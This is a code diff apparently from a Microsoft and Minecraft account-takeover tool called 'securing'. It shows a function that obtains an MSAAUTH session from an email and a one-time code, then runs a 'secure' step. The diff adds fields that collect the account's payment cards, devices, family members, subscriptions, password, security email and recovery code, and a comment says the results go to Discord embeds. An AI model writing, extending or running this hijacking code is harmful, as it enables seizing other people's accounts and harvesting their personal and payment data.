@@ -1,19 +1,20 @@
+from securing.utils.cookies.get_livedata import livedata
 from securing.build_embeds import build_account_embeds
 from securing.auth.initial_session import get_session
 from securing.utils.polish_host import polish_host
 from securing.auth.get_msaauth import get_msaauth
-from securing.utils.get_livedata import livedata
 from securing.utils.secure import secure
 import httpx
 import time
 
-async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
+async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True, ppft: str = None, rextra: dict = None):
     # Handles the data to be displayed in embeds to discord
     
     session = get_session()
     
+    print(f"Got 1")
     data = await livedata(session)
-    msaauth = await get_msaauth(session, email, device, data, code)
+    msaauth = await get_msaauth(session, email, device, data, code, ppft)
     
     account = {
         "microsoft": {
@@ -26,7 +27,16 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
             "lastName": "Failed to Get",
             "fullName": "Failed to Get",
             "region": "Failed to Get",
-            "birthday": "Failed to Get"
+            "birthday": "Failed to Get",
+            "language": "Failed to Get",
+            "family": [],
+            "devices": [],
+            "cards": [],
+            "subscriptions": {
+                "active": [], 
+                "canceled": [], 
+                "commercial": []
+            }
         },
         "minecraft": {
             "name": "No Minecraft",
@@ -42,6 +52,11 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     if not msaauth:
         return msaauth
     
+    if rextra:
+        account["password"] = rextra["password"]
+        account["security_email"] = rextra["security_email"]
+        account["recovery_code"] = rextra["recovery_code"]
+    
     match msaauth:
         case "Recovery":
             print(f"[X] - Account requires account recovery")
@@ -56,7 +71,12 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         case _:
             print(f"[+] - Got MSAAUTH")
             await polish_host(session, msaauth)
-            account = await secure(session, recovery, account)
+            print(f"[~] - Polished MSAAUTH")
+            account = await secure(
+                session = session, 
+                recovery = recovery,
+                accountInfo = account
+            )
 
     finalTime = (time.time() - initialTime)
 
